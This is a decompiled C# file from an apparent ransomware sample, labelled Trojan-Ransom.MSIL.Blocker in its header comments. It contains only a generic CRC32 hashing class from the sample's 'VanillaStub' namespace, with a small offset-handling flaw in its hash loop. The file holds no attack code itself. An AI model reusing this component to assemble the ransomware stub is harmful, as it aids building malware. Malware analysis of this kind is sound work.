// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.CRC32
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public class CRC32 : HashAlgorithm
  {
    public static readonly uint DefaultPolynomial = 3988292384;
    private static readonly uint _allOnes = uint.MaxValue;
    private static readonly CRC32 _defaultCRC;
    private static readonly Hashtable _crc32TablesCache = Hashtable.Synchronized(new Hashtable());
    private readonly uint[] _crc32Table;
    private uint _crc;

    public CRC32()
      : this(CRC32.DefaultPolynomial)
    {
    }

    public CRC32(uint polynomial)
    {
      this.HashSizeValue = 32;
      this._crc32Table = (uint[]) CRC32._crc32TablesCache[(object) polynomial];
      if (this._crc32Table == null)
      {
        this._crc32Table = CRC32._buildCRC32Table(polynomial);
        CRC32._crc32TablesCache.Add((object) polynomial, (object) this._crc32Table);
      }
      this.Initialize();
    }

    static CRC32() => CRC32._defaultCRC = new CRC32();

    public override void Initialize() => this._crc = CRC32._allOnes;

    protected override void HashCore(byte[] buffer, int offset, int count)
    {
      for (int index1 = offset; index1 < count; ++index1)
      {
        ulong index2 = (ulong) (this._crc & (uint) byte.MaxValue ^ (uint) buffer[index1]);
        this._crc >>= 8;
        this._crc ^= this._crc32Table[index2];
      }
    }

    protected override byte[] HashFinal()
    {
      byte[] numArray = new byte[4];
      ulong num = (ulong) (this._crc ^ CRC32._allOnes);
      numArray[0] = (byte) (num & (ulong) byte.MaxValue);
      numArray[1] = (byte) (num >> 8 & (ulong) byte.MaxValue);
      numArray[2] = (byte) (num >> 16 & (ulong) byte.MaxValue);
      numArray[3] = (byte) (num >> 24 & (ulong) byte.MaxValue);
      return numArray;
    }

    public static int Compute(string asciiString)
    {
      CRC32._defaultCRC.Initialize();
      return CRC32.ToInt32(CRC32._defaultCRC.ComputeHash(asciiString));
    }

    public static int Compute(Stream inputStream)
    {
      CRC32._defaultCRC.Initialize();
      return CRC32.ToInt32(CRC32._defaultCRC.ComputeHash(inputStream));
    }

    public static int Compute(byte[] buffer)
    {
      CRC32._defaultCRC.Initialize();
      return CRC32.ToInt32(CRC32._defaultCRC.ComputeHash(buffer));
    }

    public static int Compute(byte[] buffer, int offset, int count)
    {
      CRC32._defaultCRC.Initialize();
      return CRC32.ToInt32(CRC32._defaultCRC.ComputeHash(buffer, offset, count));
    }

    public byte[] ComputeHash(string asciiString) => this.ComputeHash(Encoding.ASCII.GetBytes(asciiString));

    public new byte[] ComputeHash(Stream inputStream)
    {
      byte[] numArray = new byte[4096];
      int cbSize;
      while ((cbSize = inputStream.Read(numArray, 0, 4096)) > 0)
        this.HashCore(numArray, 0, cbSize);
      return this.HashFinal();
    }

    public new byte[] ComputeHash(byte[] buffer) => this.ComputeHash(buffer, 0, buffer.Length);

    public new byte[] ComputeHash(byte[] buffer, int offset, int count)
    {
      this.HashCore(buffer, offset, count);
      return this.HashFinal();
    }

    private static uint[] _buildCRC32Table(uint polynomial)
    {
      uint[] numArray = new uint[256];
      for (int index1 = 0; index1 < 256; ++index1)
      {
        uint num = (uint) index1;
        for (int index2 = 8; index2 > 0; --index2)
        {
          if (((int) num & 1) == 1)
            num = num >> 1 ^ polynomial;
          else
            num >>= 1;
        }
        numArray[index1] = num;
      }
      return numArray;
    }

    private static int ToInt32(byte[] buffer) => BitConverter.ToInt32(buffer, 0);
  }
}
